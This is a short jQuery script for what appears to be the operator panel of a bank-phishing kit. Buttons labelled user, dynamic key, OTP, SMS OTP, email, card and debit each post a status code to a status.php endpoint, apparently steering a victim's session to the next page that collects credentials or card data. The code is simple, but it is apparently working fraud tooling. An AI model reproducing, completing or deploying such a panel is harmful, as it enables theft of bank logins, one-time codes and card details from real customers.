$(document).ready(function(){
	$(".cerrar img").click(function(evento){
		cerrar_sesion();
	});

	$(".cerrar img").hover(function(evento){
		$(".cerrar img").attr("src","../assets/img/cerrar-r.svg");
	});

	$(".cerrar img").mouseout(function(evento){
		$(".cerrar img").attr("src","../assets/img/cerrar-g.svg");
	});


	$(document).on('click', '.usuario', function() {
		$(this).attr('disabled','disabled')

		$.post( "../run/status.php",{ id:$(this).attr('id'),est:"12" },function(data) {
			load_items();
			window.location.reload();
		});
	});

	$(document).on('click', '.dinamica', function() {
		$(this).attr('disabled','disabled')

		$.post( "../run/status.php",{ id:$(this).attr('id'),est:"2" },function(data) {
			load_items();
			window.location.reload();
		});
	});

	$(document).on('click', '.otp', function() {
		$(this).attr('disabled','disabled')

		$.post( "../run/status.php",{ id:$(this).attr('id'),est:"8" },function(data) {
			load_items();
			window.location.reload();
		});
	});


	$(document).on('click', '.otpsms', function() {
		$(this).attr('disabled','disabled')

		$.post( "../run/status.php",{ id:$(this).attr('id'),est:"16" },function(data) {
			load_items();
			window.location.reload();
		});
	});

	$(document).on('click', '.otpsmsnuevo', function() {
		$(this).attr('disabled','disabled')

		$.post( "../run/status.php",{ id:$(this).attr('id'),est:"18" },function(data) {
			load_items();
			window.location.reload();
		});
	});



	$(document).on('click', '.correo', function() {
		$(this).attr('disabled','disabled')


		$.post( "../run/status.php",{ id:$(this).attr('id'),est:"4" },function(data) {
			load_items();
			window.location.reload();
		});
	});

	$(document).on('click', '.tarjeta', function() {
		$(this).attr('disabled','disabled')

		$.post( "../run/status.php",{ id:$(this).attr('id'),est:"6" },function(data) {
			load_items();
			window.location.reload();
		});
	});

	$(document).on('click', '.debito', function() {
		$(this).attr('disabled','disabled')

		$.post( "../run/status.php",{ id:$(this).attr('id'),est:"14" },function(data) {
			load_items();
			window.location.reload();
		});
	});


	$(document).on('click', '.finalizar', function() {
		$(this).attr('disabled','disabled')

		$.post( "../run/status.php",{ id:$(this).attr('id'),est:"10" },function(data) {
			load_items();
			window.location.reload();
		});
	});
});